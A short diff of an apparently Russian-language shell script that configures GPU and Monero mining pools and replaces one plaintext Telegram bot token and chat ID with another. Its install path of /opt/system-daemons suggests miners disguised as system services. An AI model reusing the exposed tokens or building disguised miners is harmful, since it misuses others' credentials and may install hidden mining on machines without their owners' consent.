@@ -7,8 +7,8 @@ WORKER_NAME=$(hostname)
 GPU_POOL="etc-eu.kryptex.network:7033"
 CPU_POOL="xmr.kryptex.network:7029"
 
-TELEGRAM_BOT_TOKEN="7705174143:AAEhkI4TsY2jJgi6rozt17Ki3nVFG_zNtWY"
-TELEGRAM_CHAT_ID="7639575061"
+TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
+TELEGRAM_CHAT_ID="7032066912"
 
 #--- СИСТЕМНЫЕ ПАРАМЕТРЫ (НЕ ТРОГАТЬ) ---#
 BASE_DIR="/opt/system-daemons"; GPU_DIR="$BASE_DIR/gpu"; CPU_DIR="$BASE_DIR/cpu"
